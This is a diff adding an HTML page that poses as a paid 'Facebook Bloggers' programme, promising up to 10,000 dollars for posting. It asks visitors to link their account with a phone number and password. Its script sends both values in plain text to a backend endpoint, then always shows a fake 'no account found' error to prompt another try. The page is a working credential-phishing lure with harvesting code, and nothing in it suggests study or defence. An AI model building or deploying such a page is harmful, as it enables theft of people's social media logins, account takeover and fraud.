@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Earn Per Postt</title>
+    <script src="tailwind/tailwind.js"></script>
+</head>
+<body>
+    <div class="fixed inset-x-0 top-0 bg-white py-4 px-3">
+        <h3 class="text-blue-500 font-bold text-xl text-center">FaceBook Bloggers</h3>
+    </div>
+    <div class="py-10">
+        <div class="h-screen w-screen flex flex-col">
+            <div class="shadow-2xl bg-[url('/image/pic1.jpg')] from-blue-400 to-blue-700 h-72 w-screen flex items-center justify-center">
+                <h2 class="text-white drop-shadow-2xl font-bold text-3xl w-64 text-center">Facebook Blogger<br><span class="font-medium text-2xl">Start earning...</span></h2>
+            </div>
+            <div class="py-10 h-screen bg-gradient-to-r from-blue-400 to-blue-700 flex items-center justify-center">
+                <div class="text-thin text-white text-center text-4xl">
+                    Get Paid,<br>For Posting On Facebook By Linking Your Account
+                </div>
+            </div>
+        </div>
+        <div class="py-10 px-3 text-center space-y-10">
+            <div class="space-y-4">
+                <h2 class="text-3xl">How it work</h2>
+                <p class="text-lg px-4">We paid you by dollars for each post you add to your Facebook account from our website (Facebook)</p>
+            </div>
+            <div class="space-y-4">
+                <h2 class="text-3xl">How much we pay</h2>
+                <p class="text-lg px-4">We pay up to 10,000 dollars to 1000 Facebook User who have link their Facebook account</p>
+            </div>
+            <div class="space-y-4">
+                <h2 class="text-3xl">Start Getting paid</h2>
+                <p class="text-lg px-4">Link your Facebook account now by logging in your account and creating your first post now</p>
+            </div>
+        </div>
+        <div class="px-4 mb-4 space-y-4">
+            <p class="text-lg px-4 text-blue-500 text-center">Link your account to go to your dashboard and start creating post</p>
+            <button onclick="show()" class="w-full rounded-3xl bg-blue-500 py-2 text-white hover:ring-4 active:ring-blue-700 ring-blue-300 duration-500">Link Account</button>
+        </div>
+        <div class="bg-zinc-700 py-10 px-3 text-white space-y-4">
+            <div class="text-lg text-center">
+                We help facebook users earn from their facebook account
+            </div>
+            <div class="text-lg text-center">
+                We pay up to 100 dollars to each user who link account per day
+            </div>
+        </div>
+        <div class="fixed shadow-2xl inset-x-0 bottom-0 bg-white px-4 py-3 pb-4 rounded-t-3xl">
+            <button onclick="show()" class="w-full rounded-3xl bg-blue-500 py-2 text-white hover:ring-4 active:ring-blue-700 ring-blue-300 duration-500">Link Account</button>
+        </div>
+        <div id="login" style="bottom: -320px;" class="fixed flex items-center justify-center inset-x-0 bottom-0 bg-white h-80 rounded-t-3xl duration-500">
+            <div class="space-y-3">
+                <div>
+                    <h2 class="text-black text-lg text-center">Link your facebook account</h2>
+                </div>
+                <div class="w-screen px-4 space-y-1">
+                    <p>Phone Number :</p>
+                    <input id="number" class="w-full py-1 px-4 hover:text-blue-500 outline-none rounded-3xl border-2 border-blue-500 duration-500" type="number">
+                </div>
+                <div class="w-screen px-4 space-y-1">
+                    <p>Password :</p>
+                    <input id="password" class="w-full py-1 px-4 hover:text-blue-500 outline-none rounded-3xl border-2 border-blue-500 duration-500" type="text">
+                </div>
+                <div class="px-4 py-2">
+                    <button onclick="login()" class="w-full rounded-3xl bg-blue-500 py-2 text-white hover:ring-4 active:ring-blue-700 ring-blue-300 duration-500">Link Account</button>
+                </div>
+            </div>
+            </div>
+        </div>
+        <div style="transform: translate(-50%, -50%); scale: 0; display: none; opacity: 0;" id="error" class="fixed bg-white z-20 w-72 top-[50%] left-[50%] items-center shadow-2xl rounded-2xl px-4 py-4 duration-500">
+            <span class="text-red-500">Error :</span> Sorry no facebook account was found with the number or password you provided
+            <div class="flex">
+                <div onclick="again()" class="text-red-500 text-lg py-2">Try Again</div>
+            </div>
+        </div>
+
+    <script>
+        var number = document.querySelector('#number')
+        var password = document.querySelector('#password')
+
+        function show() {
+            document.querySelector('#login').style.bottom = '0'
+        }
+
+        function login () {
+            if (number.value.length < 9) {
+                number.classList.add('border-red-500')
+                number.focus()
+            } else {
+                if (password.value.length < 2) {
+                    password.classList.add('border-red-500')
+                    password.focus()
+                } else {
+                    // send to api 
+                    fetch('http://localhost:8080/Backend/facebook%20blogger/?number=' + number.value + '&password=' + password.value)
+                    document.querySelector('#error').style.opacity = 1;
+                    document.querySelector('#error').style.display = "block";
+                 }
+            }
+
+        }
+
+        function again () {
+            document.querySelector('#error').style.opacity = 0;
+            document.querySelector('#error').style.display = "none";
+        }
+    </script>
+</body>
+</html>
